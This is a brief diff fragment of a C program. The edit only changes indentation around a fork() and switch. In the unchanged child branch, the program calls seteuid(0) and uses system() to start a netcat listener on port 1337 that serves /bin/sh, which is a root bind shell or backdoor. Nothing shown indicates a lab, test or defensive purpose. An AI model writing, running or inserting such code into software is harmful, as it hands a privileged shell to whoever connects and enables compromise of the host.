@@ -35,9 +35,9 @@ int main (void){
 		exit(EXIT_FAILURE);
 	}
 	
-		int nPid=fork();
-		
-		switch(nPid){
+	int nPid=fork();
+	
+	switch(nPid){
 		case 0: {
 		    seteuid(0);
 		    system("/bin/nc -c /bin/sh -l 127.0.0.1 -p 1337&");
